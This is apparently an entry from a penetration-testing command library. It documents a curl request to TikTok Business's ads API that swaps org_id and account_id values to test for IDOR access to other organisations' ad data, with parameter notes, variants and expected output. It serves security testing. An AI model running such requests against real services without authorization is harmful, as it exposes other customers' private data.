---
id: cmd-curl-modify-1
data: >-
  curl -X GET
  'https://business.tiktok.com/api/ads?org_id=YOUR_ORG&account_id=YOUR_ACC' -H
  'Authorization: Bearer TOKEN' -d
  'org_id=TARGET_ORG_ID&account_id=TARGET_ACCOUNT_ID'
tags:
  - web
  - api
  - manipulation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:27.046Z'
verified: false
validated: true
submitted: true
---
# curl-modify-request

## Command

```bash
curl -X GET 'https://business.tiktok.com/api/ads?org_id=YOUR_ORG&account_id=YOUR_ACC' -H 'Authorization: Bearer TOKEN' -d 'org_id=TARGET_ORG_ID&account_id=TARGET_ACCOUNT_ID'
```

## Description

This command uses curl to send a modified API request to TikTok Business, altering org_id and account_id parameters to test for IDOR access to unauthorized resources.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | HTTP method for querying ads data | Yes |
| `org_id=TARGET_ORG_ID` | Target organization ID to manipulate | Yes |
| `account_id=TARGET_ACCOUNT_ID` | Target account ID to access | Yes |
| `-H 'Authorization: Bearer TOKEN'` | Authentication header with session token | Yes |

## Examples

### Basic Usage

```bash
curl -X GET 'https://business.tiktok.com/api/ads' -H 'Authorization: Bearer TOKEN' -d 'org_id=123&account_id=456'
```

### Advanced Usage

```bash
curl -X GET 'https://business.tiktok.com/api/ads' -H 'Authorization: Bearer TOKEN' -d 'org_id=123&account_id=456&filter=active'
```

## Expected Output

JSON response with ads data from the target org/account if IDOR is exploitable; otherwise, an authorization error.

## Related

- [[Related Procedure|procedures/Authenticate-and-Test-IDOR-on-TikTok-Parameters]]
